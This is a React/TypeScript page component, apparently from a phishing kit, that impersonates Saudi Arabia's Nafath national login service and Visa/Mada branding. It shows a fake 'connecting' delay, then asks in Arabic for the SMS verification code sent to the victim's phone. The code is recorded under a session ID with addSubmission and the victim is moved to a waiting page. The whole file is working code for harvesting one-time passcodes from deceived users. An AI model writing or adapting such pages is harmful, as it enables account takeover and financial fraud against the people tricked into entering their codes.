import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { addSubmission } from "@/lib/submissions";
import { Header } from "@/components/layout/Header";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Loader2 } from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";
import visaMadaImage from "../assets/VISAMADAH_1779063055374.png";

export default function NomerOtp() {
  const [, setLocation] = useLocation();
  
  const [otpCode, setOtpCode] = useState("");
  const [loading, setLoading] = useState(false);
  const [initialLoading, setInitialLoading] = useState(true);
  const [timeLeft, setTimeLeft] = useState(180);

  useEffect(() => {
    // Simulate connection
    const timer = setTimeout(() => {
      setInitialLoading(false);
    }, 3000);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (initialLoading) return;
    
    if (timeLeft === 0) return;
    const timer = setInterval(() => {
      setTimeLeft(prev => prev - 1);
    }, 1000);
    return () => clearInterval(timer);
  }, [timeLeft, initialLoading]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `0${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (otpCode.length < 4) return;
    
    const sessionId = localStorage.getItem("sessionId");
    if (!sessionId) {
      setLocation("/");
      return;
    }

    setLoading(true);
    try {
      addSubmission("nomer_otp", sessionId, { otpCode });
      setTimeout(() => {
        setLocation("/nomer-wait");
      }, 2000);
    } catch {
      setLoading(false);
    }
  };

  if (initialLoading) {
    return (
      <div className="min-h-screen bg-gray-50 flex flex-col items-center justify-center">
        <Loader2 className="w-16 h-16 animate-spin text-primary mb-6" />
        <h2 className="text-2xl font-bold text-gray-800">جارٍ الاتصال...</h2>
        <p className="text-gray-500 mt-2">يرجى الانتظار</p>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      <Header />
      
      <AnimatePresence>
        {loading && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-white/90 backdrop-blur-sm z-50 flex flex-col items-center justify-center"
          >
            <Loader2 className="w-16 h-16 animate-spin text-primary mb-6" />
            <h2 className="text-2xl font-bold text-gray-800">جارٍ التحقق...</h2>
            <p className="text-gray-500 mt-2">يرجى عدم إغلاق هذه الصفحة</p>
          </motion.div>
        )}
      </AnimatePresence>

      <div className="container mx-auto px-4 py-12 flex-1 flex justify-center items-start">
        <div className="bg-white rounded-3xl shadow-lg border border-gray-200 p-8 max-w-md w-full text-center">
          
          <img src={visaMadaImage} alt="Nafath" className="h-16 mx-auto mb-6 object-contain" />
          
          <h2 className="text-xl font-bold text-gray-800 mb-2">التحقق من رقم الجوال</h2>
          <p className="text-gray-600 mb-8 text-sm">تم إرسال رمز التحقق إلى رقم جوالك</p>
          
          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="space-y-2">
              <Input 
                type="text" 
                required 
                value={otpCode} 
                onChange={e => setOtpCode(e.target.value.replace(/\D/g, "").substring(0, 6))} 
                placeholder="أدخل رمز التحقق"
                dir="ltr"
                className="text-center text-2xl tracking-widest h-14 rounded-2xl"
                maxLength={6}
                autoFocus
              />
            </div>
            
            <div className="text-gray-500 font-mono text-xl">
              {formatTime(timeLeft)}
            </div>

            <Button 
              type="submit" 
              className="w-full h-12 text-lg font-bold bg-primary hover:bg-primary/90 text-white rounded-2xl"
              disabled={loading || otpCode.length < 4}
            >
              تأكيد
            </Button>
          </form>
        </div>
      </div>

      <footer className="py-4 text-center text-xs text-gray-500 border-t border-gray-200">
        جميع الحقوق محفوظة © النفاذ الوطني
      </footer>
    </div>
  );
}
